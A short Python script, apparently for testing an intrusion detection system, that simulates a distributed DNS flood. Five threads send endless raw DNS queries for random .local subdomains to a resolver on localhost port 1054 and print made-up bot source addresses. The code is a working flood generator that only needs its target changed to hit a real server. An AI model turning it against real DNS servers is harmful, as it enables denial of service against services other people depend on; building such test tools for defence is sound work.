import socket
import random
import string
import time
import threading

DNS_IP = "127.0.0.1"
DNS_PORT = 1054
BOT_COUNT = 5          # 擬似ボット数
INTERVAL = 0.05        # 攻撃間隔（速くすると強攻撃）

def random_domain():
    name = ''.join(random.choice(string.ascii_lowercase + string.digits)
                   for _ in range(random.randint(6,12)))
    return f"{name}.local"

def build_dns_query(domain):
    tid = random.randint(0,65535).to_bytes(2,"big")
    flags = b"\x01\x00"
    qd = b"\x00\x01"
    an = ns = ar = b"\x00\x00"
    header = tid + flags + qd + an + ns + ar

    body = b""
    for part in domain.split("."):
        body += bytes([len(part)]) + part.encode()
    body += b"\x00"
    body += b"\x00\x01" + b"\x00\x01"  # A IN

    return header + body

def attack_bot(bot_id):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    fake_ip = f"10.0.0.{bot_id+10}"

    while True:
        domain = random_domain()
        packet = build_dns_query(domain)

        # IDS側で addr を差し替える想定
        sock.sendto(packet, (DNS_IP, DNS_PORT))

        print(f"[BOT-{bot_id}] {fake_ip} -> {domain}")
        time.sleep(INTERVAL)

# ---- main ----
print("[*] Distributed DNS Attack Simulator (LOCAL ONLY)")
print("[!] Target:", DNS_IP, DNS_PORT)

for i in range(BOT_COUNT):
    threading.Thread(target=attack_bot, args=(i,), daemon=True).start()

while True:
    time.sleep(1)
